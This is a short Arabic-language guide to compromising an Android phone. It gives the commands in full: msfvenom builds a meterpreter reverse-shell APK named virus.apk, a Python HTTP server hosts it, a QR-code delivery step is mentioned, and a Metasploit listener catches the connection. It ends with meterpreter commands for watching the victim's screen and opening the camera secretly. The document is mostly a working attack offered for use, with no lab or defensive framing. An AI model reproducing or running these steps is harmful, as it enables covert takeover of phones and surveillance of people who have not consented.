1. إنشاء "الحمولة" (The Payload)
msfvenom -p android/meterpreter/reverse_tcp LHOST=[IP_ADDRESS] LPORT=4444 -o virus.apk

LHOST: هو عنوان IP الخاص بجهاز الكالي لديك.
LPORT: المنفذ الذي ستستقبل عليه البيانات.
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
2. رفع الملف وتوليد الرابط
python3 -m http.server 80
الآن أصبح رابط الملف هو: http://[IP_ADDRESS]/virus.apk
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

3. دمج الرابط في كود البايثون (الباركود)
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

4. استقبال الاتصال (The Listener)
msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST [IP_ADDRESS]
set LPORT 4444
exploit
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

لرؤية ما تفعله الشاشة (بث مباشر): screenshot أو run android_highlighter (حسب الإصدار).

فتح الكاميرا سراً: webcam_stream.
